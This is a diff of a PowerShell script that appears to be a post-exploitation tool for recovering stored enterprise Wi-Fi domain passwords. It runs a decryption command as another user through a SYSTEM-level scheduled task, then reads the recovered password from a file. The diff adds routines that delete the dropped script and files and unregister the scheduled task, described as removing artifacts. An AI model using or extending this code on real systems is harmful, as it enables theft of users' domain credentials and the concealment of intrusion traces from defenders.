@@ -39,6 +39,12 @@ class EnterpriseWifiNetwork {
     [string] $GUID
 }
 
+# RETURN THIS FROM THE INVOKE-RUNPOWERSHELLASUSER CMDLET SO CLEANUP CAN BE HANDLED
+class CleanUpData {
+    [string] $TaskName 
+    [string] $ScriptPath
+}
+
 # EXECUTE A FUNCTION AS ANOTHER USER, REQUIRES SYSTEM PRIVILEGES
 function Invoke-RunPowershellAsUser {
     [OutputType([string])]
@@ -50,7 +56,7 @@ function Invoke-RunPowershellAsUser {
 
     # GENERATE RANDOM ALPHANUMERIC FILE NAME AND WRITE OUT THE COMMAND TO THE FILE
     [string] $randomStr =  -join((65..90) +(97..122) | Get-Random -Count 10 | %{[char]$_})
-    $pathToTaskFile = "C:\users\public\$($randomStr).ps1"
+    $pathToTaskFile = "C:\Users\Public\$($randomStr).ps1"
 
     Set-Content -Path $pathToTaskFile -value $command
 
@@ -66,8 +72,8 @@ function Invoke-RunPowershellAsUser {
     $seconds = [int] (Get-Date -Format "ss")
     $timeSuffix = Get-Date -Format "tt" # AM/PM
 
-    # INCREMENT TEN SECONDS
-    $seconds = $seconds + 10
+    # INCREMENT FIVE SECONDS
+    $seconds = $seconds + 5
 
     # ROLL OVER SECONDS INTO MINUTES IF NECESSARY
     if ($seconds -gt 59) {
@@ -107,6 +113,11 @@ function Invoke-RunPowershellAsUser {
 
     Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -User $user
     $task = Get-ScheduledTask -TaskName $taskName
+
+    $cleanupData = [CleanUpData]::new()
+    $cleanupData.ScriptPath = $pathToTaskFile
+    $cleanupData.TaskName = $taskName
+    return $cleanupData
 }
 # SLICE AN ARRAY
 function Get-ByteArraySlice {
@@ -357,10 +368,10 @@ function Unprotect-DomainPassword
             
             # RUN THE COMMAND AS THE USER
             Write-Host "Attempting to decrypt credentials as user $($domainCreds.LocalUserName)"
-            Invoke-RunPowershellAsUser -user $domainCreds.LocalUserName -command $command;
+            $cleanupData = Invoke-RunPowershellAsUser -user $domainCreds.LocalUserName -command $command;
 
             # SLEEP 15 SECONDS SINCE THE COMMAND IS ON A 10 SECOND DELAY
-            Start-Sleep 15;
+            Start-Sleep 10;
 
             # TODO: READ PASSWORD FROM A FILE
             $passwordStr = [string] [System.IO.File]::ReadAllText($pwFilePath);
@@ -371,9 +382,28 @@ function Unprotect-DomainPassword
                 Write-Host "Failed to get password :(";
             }
 
-            # CLEANUP
-            Remove-Item -Path $binFilePath
-            Remove-Item -Path $pwFilePath
+            # CLEANUP FILES AND DELETE THE SCHEDULE TASK TO REMOVE ARTIFACTS
+            # CAST TO STRING TO DEAL WITH ANNOYING WEIRD PROBLEM WHERE IT'S NOT A STRING OBJECT TECHNICALLY
+            $scriptPath = [string] "$($cleanupData.ScriptPath)"
+            $scriptPath = $scriptPath.trim()
+            try {
+                Write-Host "Cleaning up files..."
+                Remove-Item -Path $binFilePath
+                Remove-Item -Path $pwFilePath
+                Remove-Item -Path $scriptPath
+                Write-Host "Cleaned files."
+            }catch {
+                Write-Host "Failed to cleanup files. Look for the following: $binFilePath $pwFilePath $scriptPath"
+            }
+
+            try {
+               Write-Host "Cleaning up scheduled task..."
+                Unregister-ScheduledTask -TaskName $cleanupData.TaskName -Confirm:$false
+                Write-Host "Cleaned scheduled task"
+            } catch {
+                Write-Host "Failed to clean scheduled task $($cleanupData.TaskName); it can still be manually removed"
+            }
+            
 
         }
     } else {
